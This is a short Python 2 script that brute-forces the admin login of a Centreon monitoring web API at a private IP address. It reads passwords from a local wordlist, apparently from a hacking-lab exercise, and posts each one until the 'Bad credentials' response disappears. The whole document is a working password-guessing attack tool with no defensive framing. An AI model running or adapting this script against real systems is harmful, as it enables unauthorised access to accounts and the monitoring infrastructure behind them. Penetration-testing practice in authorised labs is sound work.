import requests
import sys

url = "http://10.16.2.244/centreon/api/index.php?action=authenticate"
expression = "Bad credentials"

def brute(username,password):
	data = {'username':username,'password':password}
	r = requests.post(url,data=data)
	if expression not in r.content :
		print "[+] Correct password Found: ",password
		sys.exit()
	else:
		print r.content," ",password

def main():
	words = [w.strip() for w in open("/home/z3r0/vhl/passlist.txt", "rb").readlines()]
	for payload in words:
		brute("admin",payload)

if __name__ == '__main__':
	main()